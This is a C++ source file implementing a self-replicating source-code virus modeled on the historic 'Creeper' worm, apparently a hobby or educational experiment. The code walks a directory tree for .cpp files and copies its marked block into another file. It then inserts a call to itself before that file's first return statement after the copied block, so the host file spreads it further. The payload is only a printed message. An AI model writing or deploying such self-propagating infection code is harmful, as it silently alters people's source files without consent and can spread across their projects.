// ========I'm the creeper:========

#include <iostream>
#include <fstream>
#include <vector>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

#define MVECTOR std::vector<std::string>

MVECTOR readFile(std::string name)
{
    MVECTOR buffer;
    std::ifstream file(name);
    if (!file)
        return buffer;

    std::string line;
    while (getline(file, line))
        buffer.push_back(line);

    return buffer;
}

template <bool dir = true>
int getIndex(MVECTOR &vect, std::string subString)
{
    for (int i = 0; i < vect.size(); i++)
        if (vect[i].find(subString) != std::string::npos)
            return i;

    return -1;
}

template <>
int getIndex<false>(MVECTOR &vect, std::string subString)
{
    for (int i = vect.size() - 1; i >= 0; i--)
        if (vect[i].find(subString) != std::string::npos)
            return i;

    return -1;
}

MVECTOR Walker(std::string pattern)
{
    DIR *d;
    struct dirent *dir;
    d = opendir(".");
    MVECTOR path;
    if (d)
    {
        while ((dir = readdir(d)) != NULL)
        {
            if (strcmp(dir->d_name, ".") == 0 || strcmp(dir->d_name, "..") == 0)
                continue;

            if (dir->d_type == DT_DIR)
            {
                chdir(dir->d_name);
                auto result = Walker(pattern);
                chdir("..");

                if (!result.empty())
                {
                    for (auto &p : result)
                        p = std::string(dir->d_name) + "/" + p;
                    path.insert(path.end(), result.begin(), result.end());
                }
            }

            bool find = std::string(dir->d_name).find(pattern) != std::string::npos;
            if (find)
                path.push_back(dir->d_name);
        }
        closedir(d);
    }
    return path;
}

void Creeper(const char *root, std::string pattern)
{
    auto files = Walker(pattern);
    MVECTOR replicate;
    int begin;
    int end;

    for (auto name : files)
    {
        replicate = readFile(name);
        begin = getIndex<>(replicate, "I'm the creeper");
        end = getIndex<false>(replicate, "Catch me if you can");
        if (begin != -1 && end != -1)
            break;
    }

    if (begin == -1 || end == -1)
        return;

    chdir(root);
    files = Walker(pattern);
    MVECTOR copyFile;
    std::string fileName;

    for (auto name : files)
    {
        copyFile = readFile(name);
        if (getIndex<>(copyFile, "I'm the creeper") == -1 && getIndex<>(copyFile, "return") != -1)
        {
            fileName = name;
            break;
        }
    }

    if (fileName.empty())
        return;

    std::cout << "Path: " + std::string(root) + fileName + "\n\n";
    std::cout << "I'm the creeper, catch me if you can \n";

    copyFile.insert(copyFile.begin(), replicate.begin() + begin, replicate.begin() + end + 1);

    bool stop = true;

    std::ofstream file(fileName);
    for (auto line : copyFile)
    {
        stop &= line.find("Catch me if you can") == std::string::npos;
        if (!stop && line.find("return") != std::string::npos)
            file << "\tCreeper(\"" + std::string(root) + "\", \"" + pattern + "\");" << std::endl;

        file << line << std::endl;
    }
    file.close();
}

// ========Catch me if you can========

int main(int argc, char *argv[])
{
    Creeper("/mnt/d/Program/C/TheoryOfPossibility/", ".cpp");

    return 0;
}
